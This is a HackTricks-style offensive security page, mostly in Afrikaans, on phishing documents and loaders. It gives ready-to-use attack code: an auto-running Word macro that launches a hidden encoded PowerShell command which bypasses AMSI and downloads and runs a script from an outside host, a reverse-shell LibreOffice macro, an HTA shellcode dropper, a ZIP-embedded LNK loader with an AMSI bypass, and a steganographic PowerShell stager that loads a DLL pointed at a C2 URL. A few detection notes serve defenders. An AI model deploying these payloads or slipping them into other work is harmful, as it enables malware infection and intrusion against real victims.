# Phishing Lêers & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office Dokumente

Microsoft Word voer lêerdata-validering uit voordat 'n lêer geopen word. Data-validering word uitgevoer in die vorm van datastruktuuridentifikasie, teen die OfficeOpenXML-standaard. As enige fout tydens die datastruktuuridentifikasie voorkom, sal die lêer wat ontleed word nie geopen word nie.

Gewoonlik gebruik Word-lêers wat macros bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul macro-uitvoeringsvermoëns te behou.\
Byvoorbeeld, 'n RTF-lêer ondersteun nie macros nie, volgens ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en in staat wees tot macro-uitvoering.\
Dieselfde interne strukture en meganismes geld vir alle sagteware van die Microsoft Office Suite (Excel, PowerPoint etc.).

Jy kan die volgende opdrag gebruik om te kontroleer watter uitbreidings deur sekere Office-programme uitgevoer gaan word:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-lêers wat na ’n afgeleë template verwys (File –Options –Add-ins –Manage: Templates –Go) wat makros insluit, kan ook makros “uitvoer”.

### Eksterne Beeldlading

Gaan na: _Insert --> Quick Parts --> Field_\
_**Kategorieë**: Skakels en Verwysings, **Veldname**: includePicture, en **Lêernaam of URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Makro Agterdeur

Dit is moontlik om makros te gebruik om arbitrêre kode vanaf die dokument uit te voer.

#### Autoload funksies

Hoe algemener dit is, hoe groter die kans dat AV dit sal opspoor.

- AutoOpen()
- Document_Open()

#### Makro Kode Voorbeelde
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Verwyder metadata handmatig

Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector sal oopmaak. Klik **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.

#### Doc-uitbreiding

Wanneer klaar, kies die **Save as type** dropdown, verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
Doen dit omdat jy **nie macro's binne 'n `.docx` kan stoor nie** en daar is 'n **stigma** **around** die macro-enabled **`.docm`** uitbreiding (e.g. die miniatuur-ikoon het 'n groot `!` en sommige web/email gateway blokkeer hulle heeltemal). Daarom is hierdie **legacy `.doc` extension die beste kompromie**.

#### Kwaadaardige Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer dokumente kan Basic macros insluit en dit outomaties uitvoer wanneer die lêer geopen word deur die macro te bind aan die **Open Document** event (Tools → Customize → Events → Open Document → Macro…). 'n Eenvoudige reverse shell macro lyk soos:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Let op die dubbel-aanhalingstekens (`""`) binne die string – LibreOffice Basic gebruik dit om letterlike aanhalingstekens te ontsnap, so payloads wat eindig met `...==""")` hou beide die innerlike opdrag en die Shell-argument in balans.

Delivery tips:

- Stoor as `.odt` en koppel die makro aan die dokumentgebeurtenis sodat dit onmiddellik uitgevoer word wanneer dit geopen word.
- Wanneer jy e-pos stuur met `swaks`, gebruik `--attach @resume.odt` (die `@` is nodig sodat die lêerbites, nie die lêernaamstring, as die aanhangsel gestuur word nie). Dit is krities wanneer jy SMTP-bedieners misbruik wat arbitrêre `RCPT TO`-ontvangers sonder validering aanvaar.

## HTA Lêers

'n HTA is 'n Windows-program wat **HTML en skripttale (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en word uitgevoer as 'n "fully trusted" toepassing, sonder die beperkings van 'n blaaier se sekuriteitsmodel.

'n HTA word uitgevoer met **`mshta.exe`**, wat tipies saam met **Internet Explorer** **geïnstalleer** is, wat **`mshta` afhanklik van IE** maak. As dit verwyder is, sal HTA's nie uitgevoer kan word nie.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Afdwing van NTLM Authentication

Daar is verskeie maniere om **force NTLM authentication "remotely"**, byvoorbeeld, jy kan **onsigbare beelde** by e-posse of HTML voeg wat die gebruiker sal toegang (selfs HTTP MitM?). Of stuur die slagoffer die **adres van files** wat 'n **authentication** sal **trigger** net deur die vouer te open.

**Kyk na hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moet nie vergeet dat jy nie net die hash of die authentication kan steel nie maar ook **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Baie doeltreffende veldtogte lewer 'n ZIP wat twee legitimiteite decoy documents (PDF/DOCX) en 'n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell loader binne die ZIP se rou bytes gestoor word ná 'n unieke marker, en die .lnk onttrek en dit heeltemal in geheue uitvoer.

Tipiese vloei wat deur die .lnk PowerShell one-liner geïmplementeer word:

1) Vind die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, en die ouer gids van die huidige werkmap.
2) Lees die ZIP-bytes en vind 'n hardgekodeerde marker (bv. xFIQCV). Alles ná die marker is die embedded PowerShell payload.
3) Kopieer die ZIP na %ProgramData%, pak dit daar uit, en open die decoy .docx om legitiem te voorkom.
4) Oorslaan van AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate die volgende fase (bv. verwyder alle # karakters) en voer dit in geheue uit.

Voorbeeld PowerShell skeleton om die embedded stage uit te kerf en uit te voer:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Aantekeninge
- Aflewering misbruik dikwels betroubare PaaS-subdomeine (e.g., *.herokuapp.com) en kan payloads filter (bedien onskadelike ZIPs gebaseer op IP/UA).
- Die volgende fase desifreer dikwels base64/XOR shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyf-artefakte te minimaliseer.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-lêers wat die ASCII marker string (e.g., xFIQCV) bevat wat aan die argiefdata aangeheg is.
- .lnk wat ouer-/gebruikermappe opsom om die ZIP te lokaliseer en 'n afleidingsdokument open.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langlopende business threads wat eindig met skakels aangebied onder vertroude PaaS-domeine.

## Steganography-delimited payloads in images (PowerShell stager)

Recent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64 PowerShell stager. That stager downloads an image (often GIF) that contains a Base64-encoded .NET DLL hidden as plain text between unique start/end markers. The script searches for these delimiters (examples seen in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extracts the between-text, Base64-decodes it to bytes, loads the assembly in-memory and invokes a known entry method with the C2 URL.

Werkvloei
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-voorbeeld om 'n DLL uit 'n beeld te kerf en 'n .NET-metode in-memory aan te roep:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Aantekeninge
- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
- AMSI/ETW bypass and string deobfuscation are commonly applied before loading the assembly.
- Opsporing: skandeer afgelaaide beelde na bekende afskeidingstekens; identifiseer PowerShell wat beelde toegang en onmiddellik Base64-blokke dekodeer.

Sien ook stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Skeletlogika (abstrak):
- Lees eie lêerinhoud
- Vind 'n Base64 blob tussen rommelstringe
- Dekodeer na ASCII PowerShell
- Voer uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` aanroep

Opsporingsaanwysers
- Gearchiveerde JS/VBS-aanhangsels wat `powershell.exe` begin met `-enc`/`FromBase64String` in die opdragreël.
- `wscript.exe` wat `powershell.exe -nop -w hidden` vanaf gebruiker-temp-paaie begin.

## Windows files to steal NTLM hashes

Kyk na die bladsy oor **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Verwysings

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
